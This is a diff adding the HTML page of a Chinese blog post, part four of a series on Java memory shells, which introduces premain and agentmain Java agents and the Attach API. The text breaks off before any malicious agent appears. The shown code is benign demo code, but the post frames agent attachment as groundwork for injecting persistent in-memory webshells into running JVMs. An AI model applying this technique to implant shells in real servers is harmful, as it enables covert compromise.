@@ -1,0 +1,1273 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java 内存马第四篇 - Agent 内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 内存马第四篇 - Agent 内存马">
+<meta property="og:url" content="http://xvshifu.github.io/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="Java 内存马第四篇 - Agent 内存马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524285.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52403351/1762422656588-c0f73018-27de-47c9-997b-503f4024baed.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523243.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523492.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524494.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525788.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525851.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523146.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523380.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523450.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523934.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523970.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523682.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png">
+<meta property="article:published_time" content="2025-11-08T07:03:00.000Z">
+<meta property="article:modified_time" content="2025-11-08T07:30:04.711Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java 内存马第四篇 - Agent 内存马 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-steam"></i>
+                <span>game</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/mf" target="_self">
+                    
+                    <span>魔方</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/sl" target="_self">
+                    
+                    <span>扫雷</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/2048" target="_self">
+                    
+                    <span>2048</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/wzq" target="_self">
+                    
+                    <span>五子棋</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/txz" target="_self">
+                    
+                    <span>推箱子</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/dblk" target="_self">
+                    
+                    <span>躲避绿块</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/catch-the-cat-master" target="_self">
+                    
+                    <span>围住小猫</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/0" target="_self">
+                    
+                    <span>时钟1</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/game/clock/1" target="_self">
+                    
+                    <span>时钟2</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java 内存马第四篇 - Agent 内存马"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-08 15:03" pubdate>
+          2025年11月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java 内存马第四篇 - Agent 内存马</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月8日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java-内存马第四篇-Agent-内存马"><a href="#Java-内存马第四篇-Agent-内存马" class="headerlink" title="Java 内存马第四篇 - Agent 内存马"></a>Java 内存马第四篇 - Agent 内存马</h1><h1 id="四、-Java-Agent-内存马"><a href="#四、-Java-Agent-内存马" class="headerlink" title="四、 Java Agent 内存马"></a>四、 Java Agent 内存马</h1><h2 id="4-1-Java-Agent示例"><a href="#4-1-Java-Agent示例" class="headerlink" title="4.1 Java Agent示例"></a>4.1 Java Agent示例</h2><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在<strong>JVM启动前加载的</strong><code>**premain-Agent**</code>，另一种是<strong>JVM启动之后加载的</strong><code>**agentmain-Agent**</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg" srcset="/img/loading.gif" lazyload alt="premain-Agent"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg" srcset="/img/loading.gif" lazyload alt="agentmain-Agent"></p>
+<h3 id="4-1-1-premain-Agent"><a href="#4-1-1-premain-Agent" class="headerlink" title="4.1.1 premain-Agent"></a>4.1.1 premain-Agent</h3><h4 id="使用外部-MANIFEST-MF-文件-创建"><a href="#使用外部-MANIFEST-MF-文件-创建" class="headerlink" title="使用外部 MANIFEST.MF 文件 创建"></a>使用外部 MANIFEST.MF 文件 创建</h4><h5 id="创建Java-Agent类"><a href="#创建Java-Agent类" class="headerlink" title="创建Java Agent类"></a>创建Java Agent类</h5><p>此处不写包名，避免后续的编译的 jar 包找不到类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.premain.agent;</span><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentPremain</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;premain-Agent&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="创建MANIFEST-MF文件"><a href="#创建MANIFEST-MF文件" class="headerlink" title="创建MANIFEST.MF文件"></a>创建MANIFEST.MF文件</h5><p><strong>最后必须有一个空行！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Premain-Class: JavaAgentPremain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure>
+
+<p>​	</p>
+<h5 id="创建测试主程序"><a href="#创建测试主程序" class="headerlink" title="创建测试主程序"></a>创建测试主程序</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.test;</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Agent!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Main-Class: HelloAgent<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>创建俩个文件夹，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>HelloAgent.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h5 id="创建Agent-JAR文件"><a href="#创建Agent-JAR文件" class="headerlink" title="创建Agent JAR文件"></a>创建Agent JAR文件</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cfm ..\dist\agent.jar ..\src\main\resources\MANIFEST.MF JavaAgentPremain.<span class="hljs-keyword">class</span><br>jar cfm ..\dist\hello.jar ..\src\main\resources1\MANIFEST.MF HelloAgent.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h5 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>hello.<span class="hljs-keyword">jar</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="4-1-2-agentmain-Agent"><a href="#4-1-2-agentmain-Agent" class="headerlink" title="4.1.2 agentmain-Agent"></a>4.1.2 agentmain-Agent</h3><p>agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。  </p>
+<p>premain方法在JDK1.5中提供，在JDK版本为1.5时，开发者只能在main加载之前添加手脚，但是对于大部分内存马注入时，都是JVM已经运行的情况下。在JDK1.6中实现了attach-on-demand，我们可以使用AttachAPI动态的加载Agent，agentmain能够在JVM启动后加载并实现相应的修改字节码的功能。</p>
+<p>AttachAPI在tool.jar中，而JVM启动时默认不加载该依赖，需要我们在classpath中额外进行指定</p>
+<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine 可以实现获取 JVM 信息、内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p>
+<p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span><br>VirtualMachine.attach()<br><span class="hljs-comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span><br>VirtualMachine.loadAgent()<br><span class="hljs-comment">//获得当前所有的JVM列表</span><br>VirtualMachine.list()<br><span class="hljs-comment">//解除与特定JVM的连接</span><br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="VirtualMachineDescriptor-类"><a href="#VirtualMachineDescriptor-类" class="headerlink" title="VirtualMachineDescriptor 类"></a>VirtualMachineDescriptor 类</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p>
+<p>示例：</p>
+<p>pom.xml:</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39309402/article/details/102480878">Missing artifact com.sun:tools:jar:1.8.0有效解决办法（亲测）-CSDN博客</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.sun/tools --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0_451<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;JAVA_HOME&#125;/lib/tools.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">get_PID</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.test.get_PID&quot;</span>)) &#123;<br>                System.out.println(vmd.id());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="实现-agentmain-Agent"><a href="#实现-agentmain-Agent" class="headerlink" title="实现 agentmain-Agent"></a>实现 agentmain-Agent</h4><p>编写一个 <code>Sleep_Hello</code>类，模拟正在运行的 JVM</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepHello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>编写JavaAgentAgentmain</p>
